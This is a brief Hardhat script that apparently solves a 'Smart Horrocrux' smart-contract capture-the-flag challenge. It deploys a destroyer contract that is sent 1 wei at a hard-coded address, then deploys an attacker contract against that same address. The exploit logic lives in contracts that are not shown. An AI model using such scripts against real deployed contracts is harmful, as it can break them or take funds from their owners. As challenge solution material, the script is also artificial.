import { ethers } from "hardhat";

const contractAddress = "0xEaf69a643B0B51CeBd0787E21390919926f17d6C";
let tx;

async function main() {
  const destroyerContract = await (await ethers.getContractFactory("SmartHorrocruxDestroyer")).deploy();
  await destroyerContract.deployed();
  tx = await destroyerContract.destroy(contractAddress, { value: 1 });
  await tx.wait();

  const attackerContract = await (await ethers.getContractFactory("SmartHorrocruxAttacker")).deploy(contractAddress);
  await attackerContract.deployed();
}

main().catch(error => {
  console.error(error);
  process.exit(1);
});
